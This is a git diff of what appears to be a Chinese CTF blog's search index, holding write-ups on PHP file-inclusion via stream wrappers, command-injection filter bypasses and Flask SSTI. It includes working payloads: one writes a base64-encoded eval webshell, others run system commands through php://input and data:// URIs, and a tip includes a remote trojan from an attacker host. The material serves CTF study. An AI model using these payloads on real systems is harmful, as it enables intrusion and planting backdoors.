class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123;</span><br><span class="line">include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>#直接为包含对象添加jpg后缀，然后进行包含</p><?php$file = $_GET['file'];include($file.'.jpg');?><h2 id="绕过方法：">绕过方法：</h2><p>绕过方法：<br>①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46fab7eacc6b0f867e3e07462fc016e1.png" alt="在这里插入图片描述"></p><p>②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7105d73de0cdab6f3d9e995d3e87c295.png" alt="在这里插入图片描述"></p>]]></content>
+        <content type="html"><![CDATA[<p>[TOC]</p><p>php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。</p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;allow_url_include&quot;,&quot;on&quot;);</span><br><span class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    echo &#x27;flag 在flag.php中&#x27;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;传入一个file试试&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">include_once($file);</span><br><span class="line">?&gt; flag 在flag.php中</span><br></pre></td></tr></table></figure><p>发现有include_once函数；<br>include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p><p>于是利用伪协议构造，</p><p>php://filter/convert.base64-encode/resource=flag.php</p><p>得到经过Base64加密的flag，解密即可。</p><h2 id="常见的php伪协议">常见的php伪协议</h2><p>1）file:// 访问本地文件系统</p><p>2）http:// 访问HTTP(S)网址</p><p>3）ftp:// 访问FTP(S)URL</p><p>4)php:// 访问各个输出输入流</p><p>5)zlib:// 处理压缩流</p><p>6)data:// 读取数据</p><p>7)glob:// 查找匹配的文件路径模式</p><p>8)phar:// PHP归档</p><p>9)rar:// RAR数据压缩</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240915150327.png" alt=""></p><h2 id="协议详细：">协议详细：</h2><p>一、环境概要：<br>PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p><p>1.php.ini配置文件参数：</p><p>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；<br>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；<br>2.常用伪协议条件及方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt="在这里插入图片描述"></p><p>3.注意点</p><p>①各个伪协议适用php版本不尽相同，以下php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>②以下所有实例均使用Firefox浏览器</p><p>二、伪协议实例</p><h4 id="1-php-input">1.php://input</h4><p>php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于 php://input 不依赖于特定的 php.ini 指令，可以使用它代替 $HTTP_RAW_POST_DATA。</p><p>php://input   (执行post中的命令)</p><p>注意点<br>①input必须以post请求<br>②enctype=“multipart/form-data” 的时候 php://input 是无效的<br>③allow_url_include=on</p><p>实例一：php://input将文件包含漏洞变成代码执行漏洞</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ipconfig&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e5f2a0a7a079c20ae6af01a5753bdd82.png" alt=""></p><p>实例二：php://input利用文件包含写入shell</p><p>①目标网站存在包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>②使用php://input，将执行代码通过在POST data中提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#post方式提交</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行成功会在当前目录下生成一句话shell，可直接连接</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/075dbc6a76924f750b80ef7bcd0a8964.png" alt="在这里插入图片描述"></p><p>实例三：php://input协议直接写入shell</p><p>①含有php://input的代码漏洞文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;); </span><br><span class="line">eval($data); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST直接传参执行php代码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b14c8e1c01df529a99ef1a94150ba4f7.png" alt="在这里插入图片描述">同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_put_contents(&quot;ceshi.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ab163614fd0d637a0c968b0d80ba168c.png" alt="在这里插入图片描述"></p><p>需要注意的是，此方法使用条件为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.allow_url_include = On</span><br><span class="line"></span><br><span class="line">2. PHP &gt;= 5.2.0</span><br><span class="line">3. 当前文件有写入权限</span><br></pre></td></tr></table></figure><h4 id="2-data-URL代码执行">2.data:URL代码执行</h4><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><p>#文件包含代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include $_GET[&#x27;file&#x27;]?&gt;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d8db3c74cf4384ce95fee2a92a3286a.png" alt=""></p><p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p><h4 id="3-php-filter读取源代码">3.php://filter读取源代码</h4><p>php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?file=php://filter/read=convert.base64-encode/resource=1.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php(使用base64读取源文件)</span><br></pre></td></tr></table></figure><blockquote><p>有时题目会需要我们必须包含某个字符串<br>技巧是php://filter伪协议可以套一层协议<br>比如我们需要包含woofers这个字符串：php://filter/read=convert.base64-encode/woofers/resource=index</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81ffdc55f82671f8dcb54cf09e267f66.png" alt="在这里插入图片描述"></p><h4 id="4-file-物理路径包含文件">4.file://物理路径包含文件</h4><p>file:// 协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=file:///C:\\phpStudy\\WWW\\fileinclude\\2\\1.txt</span><br></pre></td></tr></table></figure><p>file://机器的IP地址/目录/文件（这个后面不一定需要跟文件，如果只写一个目录的话就是查看该目录下有哪些文件）<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/106b1e158dda18f56b78e9000c5b0dcc.png" alt="在这里插入图片描述"></p><h4 id="5-data-：利用文件包含-data-可进行命令执行">5.data://：利用文件包含&amp;data://可进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.3/1.php?filename=data://text/plain,%3C?php%20system(%27whoami%27);?%3E</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/42786ed141197be7c7152764d03fb81d.png" alt="在这里插入图片描述"></p><p>data协议就是会把后面的一段字符串当成php代码区执行，所以读取flag.php的文件就可以看到flag了</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>php://data/plain;base64,XXXX（base64编码后的数据）</p><p>data:text/plain,XXX</p><p>可能的编码的问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法：</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。<br>2.添加空格改变base64编码。<br>3.将+号换成%2b<br><strong>其实不需要通过base64编码来实现！！！</strong><br><strong>将</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>改变成url编码。这样浏览器可以识别！</strong></p><h4 id="6-zip-绕过文件包含下的附加后缀">6.zip://绕过文件包含下的附加后缀</h4><p>以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p><p>验证包含对象文件后缀是否为jpg，如果是才进行包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123;</span><br><span class="line">include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>#直接为包含对象添加jpg后缀，然后进行包含</p><?php$file = $_GET['file'];include($file.'.jpg');?><h5 id="绕过方法：">绕过方法：</h5><p>绕过方法：<br>①实战情况下往目标站点上传zip文件，里面压缩着一个jpg格式的php脚本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46fab7eacc6b0f867e3e07462fc016e1.png" alt="在这里插入图片描述"></p><p>②构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7105d73de0cdab6f3d9e995d3e87c295.png" alt="在这里插入图片描述"></p><h4 id="phar-伪协议">phar://伪协议</h4><p>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 ，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://xxx.png/shell （不带后缀名）</span><br></pre></td></tr></table></figure><p>注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</p><h2 id="积累：">积累：</h2><p>1.如果开启了远程文件包含，可以先包含一下http://www.baidu.com（也可以当作判断是否开启远程包含的方法），行得通就直接包含本地服务器的木马，然后蚁剑连接。</p><p>比如：file=http://www.baidu.com行得通，就可以file=http://ip/🐎路径</p>]]></content>
       
       
       <categories>
@@ -1554,31 +1579,6 @@
     
     
     <entry>
-      <title>刷题2024.10.19</title>
-      <link href="/posts/c299aaba.html"/>
-      <url>/posts/c299aaba.html</url>
-      
-        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="MoeCTF-2021-babyRCE">[MoeCTF 2021]babyRCE</h4><blockquote><p>考点：关键词过滤</p><p>来源：nssctf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>先用ls查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170841483.png" alt="image-20241019170841483"></p><blockquote><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;fl\ag.php</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170919138.png" alt="image-20241019170919138"></p><p><strong>注意：1.有时候使用cat会一片空白，需要查看源码</strong></p><p>​             <strong>2.允许的条件下，可以先用ls，再用cat</strong></p><h4 id="command-execution">command_execution</h4><blockquote><p>考点：命令执行</p><p>来源：攻防世界</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182142415.png" alt="image-20241019182142415"></p><blockquote><p>先ping一下127.0.0.1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182650673.png" alt="image-20241019182650673"></p><blockquote><p>再用;来连接两个命令  127.0.0.1;ls</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182844520.png" alt="image-20241019182844520"></p><blockquote><p>试试看能不能查看inddex.php</p><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183259450.png" alt="image-20241019183259450"></p><blockquote><p>很明显，不行，那就退级看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183409397.png" alt="image-20241019183409397"></p><blockquote><p>在home中发现flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183459124.png" alt="image-20241019183459124"></p><blockquote><p>查看flag</p><p>127.0.0.1;cat …/…/…/home/flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019173221179.png" alt="image-20241019173221179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ac541782e73fa1da4a98ec4bc3449fb1&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> web-wp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SHCTF-2024-week2-wp</title>
       <link href="/posts/8843d8f6.html"/>
       <url>/posts/8843d8f6.html</url>
@@ -1596,6 +1596,31 @@
         <tags>
             
             <tag> 比赛wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>刷题2024.10.19</title>
+      <link href="/posts/c299aaba.html"/>
+      <url>/posts/c299aaba.html</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="MoeCTF-2021-babyRCE">[MoeCTF 2021]babyRCE</h4><blockquote><p>考点：关键词过滤</p><p>来源：nssctf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>先用ls查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170841483.png" alt="image-20241019170841483"></p><blockquote><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$&#123;IFS&#125;fl\ag.php</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019170919138.png" alt="image-20241019170919138"></p><p><strong>注意：1.有时候使用cat会一片空白，需要查看源码</strong></p><p>​             <strong>2.允许的条件下，可以先用ls，再用cat</strong></p><h4 id="command-execution">command_execution</h4><blockquote><p>考点：命令执行</p><p>来源：攻防世界</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182142415.png" alt="image-20241019182142415"></p><blockquote><p>先ping一下127.0.0.1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182650673.png" alt="image-20241019182650673"></p><blockquote><p>再用;来连接两个命令  127.0.0.1;ls</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019182844520.png" alt="image-20241019182844520"></p><blockquote><p>试试看能不能查看inddex.php</p><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183259450.png" alt="image-20241019183259450"></p><blockquote><p>很明显，不行，那就退级看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183409397.png" alt="image-20241019183409397"></p><blockquote><p>在home中发现flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019183459124.png" alt="image-20241019183459124"></p><blockquote><p>查看flag</p><p>127.0.0.1;cat …/…/…/home/flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019173221179.png" alt="image-20241019173221179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ac541782e73fa1da4a98ec4bc3449fb1&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web-wp </tag>
             
         </tags>
       
@@ -1804,31 +1829,6 @@
     
     
     <entry>
-      <title>刷题2024.9.11</title>
-      <link href="/posts/5f69c5a8.html"/>
-      <url>/posts/5f69c5a8.html</url>
-      
-        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ctfshow愚人杯-easy-ssti">ctfshow愚人杯 easy_ssti</h2><blockquote><p>考点：ssti漏洞（<strong>见笔记</strong>）</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195417125.png" alt="image-20240911195417125"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195446013.png" alt="image-20240911195446013"></p><blockquote><p>下载这个文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195520690.png" alt="image-20240911195520690"></p><blockquote><p>打开查看代码，分析可能在/hello/路径下存在ssti漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行&#123;&#123;&#125;&#125;测试，发现真是</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195713451.png" alt="image-20240911195713451"></p><blockquote><p>剩下的就是按照笔记那样的步骤一步一步走就行</p><p>重点强调一下如何找&lt;class ‘os._wrap_close’&gt;</p></blockquote><blockquote><p>1.先找到其位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200145243.png" alt="image-20240911200145243"></p><blockquote><p>2.查询&lt;class ，再选中&lt;class ‘os._wrap_close’&gt;</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200237432.png" alt="image-20240911200237432"></p><blockquote><p>3.上下查询即可看到第几个。下标就是再-1。这里就是133-1=132.</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200338927.png" alt="image-20240911200338927"></p><blockquote><p>这道题在执行cat /flag命令时会Not Found。</p><p>猜测了一下，应该是将语句中的&quot;/&quot;当成目录了。</p><p>那就试试base64+管道符绕过。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;cat /fl*&#x27;)替换成(&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>最后得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200749213.png" alt="image-20240911200749213"></p><h2 id="GDOUCTF-2023-ez-ze">[GDOUCTF 2023]&lt;ez_ze&gt;</h2><blockquote><p>考点：ssti漏洞，fenjing一把梭</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911204933643.png" alt="image-20240911204933643"></p><blockquote><p>输入1111，试试看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205018866.png" alt="image-20240911205018866"></p><blockquote><p>表面在/get_flag路径下可能存在ssti漏洞。方法是post，变量是name。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205753411.png" alt="image-20240911205753411"></p><blockquote><p>直接使用fenjing工具拿到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210006897.png" alt="image-20240911210006897"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210026354.png" alt="image-20240911210026354"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> web-wp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>BaseCTF-week3-wp</title>
       <link href="/posts/7f421f2e.html"/>
       <url>/posts/7f421f2e.html</url>
@@ -1846,6 +1846,31 @@
         <tags>
             
             <tag> 比赛wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>刷题2024.9.11</title>
+      <link href="/posts/5f69c5a8.html"/>
+      <url>/posts/5f69c5a8.html</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ctfshow愚人杯-easy-ssti">ctfshow愚人杯 easy_ssti</h2><blockquote><p>考点：ssti漏洞（<strong>见笔记</strong>）</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195417125.png" alt="image-20240911195417125"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195446013.png" alt="image-20240911195446013"></p><blockquote><p>下载这个文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195520690.png" alt="image-20240911195520690"></p><blockquote><p>打开查看代码，分析可能在/hello/路径下存在ssti漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 